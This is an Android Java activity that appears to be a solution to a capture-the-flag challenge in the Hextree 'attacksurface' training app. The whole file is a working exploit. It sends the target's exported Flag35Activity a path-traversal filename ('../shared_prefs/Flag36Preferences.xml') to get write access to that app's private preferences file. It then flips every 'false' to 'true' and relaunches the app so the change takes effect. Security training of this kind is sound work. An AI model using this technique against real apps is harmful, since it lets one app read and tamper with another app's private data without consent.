package com.android.zerohextree;

import android.content.Intent;
import android.os.Bundle;

import com.google.android.material.snackbar.Snackbar;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.util.Log;
import android.view.View;

import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.android.zerohextree.databinding.ActivityFlag36Binding;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;

public class flag36 extends AppCompatActivity {



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag35Activity");
        startActivityForResult(intent, 42);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.i("QueryFlag36", String.valueOf(data.getData()));
        try {
            InputStream inputStream = getContentResolver().openInputStream(data.getData());
            StringBuilder stringBuilder = new StringBuilder();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line;

            while ((line = reader.readLine())!=null){
                // Replace false with true
                line = line.replaceAll("false", "true");
                stringBuilder.append(line).append("\n");
            }
            reader.close();
            // Write the modified content back to the file
            OutputStream outputStream = getContentResolver().openOutputStream(data.getData());
            outputStream.write(stringBuilder.toString().getBytes());
            outputStream.close();
            // restart the app to take effect
            Intent openFlag36Activity = new Intent();
            openFlag36Activity.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag36Activity");
            startActivity(openFlag36Activity);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

    }
}